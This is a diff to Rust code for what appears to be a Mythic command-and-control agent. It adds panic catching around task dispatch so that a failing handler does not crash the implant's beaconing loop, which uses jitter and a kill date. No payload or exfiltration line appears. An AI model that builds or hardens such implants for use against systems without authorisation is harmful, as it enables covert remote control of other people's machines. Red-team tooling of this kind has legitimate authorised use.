@@ -1,4 +1,5 @@
 use core::sync::atomic::Ordering;
+use std::panic::catch_unwind;
 use std::thread::sleep;
 use std::time::Duration;
 
@@ -15,6 +16,13 @@ use crate::tasks;
 use crate::{DEBUG, INTERVAL, JITTER, KILLDATE, SHOULD_EXIT, set_killdate, set_sleep};
 
 // ── Helpers ─────────────────────────────────────────────
+
+/// Dispatch a task, catching panics so one bad handler can't crash the agent.
+fn safe_dispatch(task: &mythic::TaskMessage) -> TaskResponse {
+    let t = task.clone();
+    catch_unwind(move || tasks::dispatch(&t))
+        .unwrap_or_else(|_| TaskResponse::failed(task.id, "task handler panicked"))
+}
 
 fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<MythicAgent> {
     for c2 in c2s {
@@ -147,7 +155,7 @@ pub fn run(config: Config) -> MythicResult<()> {
         println!("task: {:?}", tasking);
     }
     for t in &tasking.tasks {
-        pending.push(tasks::dispatch(t));
+        pending.push(safe_dispatch(t));
     }
     if SHOULD_EXIT.load(Ordering::Acquire) {
         let c2 = profiles.choose(&mut rng).unwrap();
@@ -175,7 +183,7 @@ pub fn run(config: Config) -> MythicResult<()> {
                     println!("task: {:?}", tasking);
                 }
                 for t in &tasking.tasks {
-                    pending.push(tasks::dispatch(t));
+                    pending.push(safe_dispatch(t));
                 }
                 if SHOULD_EXIT.load(Ordering::Acquire) {
                     let c2 = profiles.choose(&mut rng).unwrap();
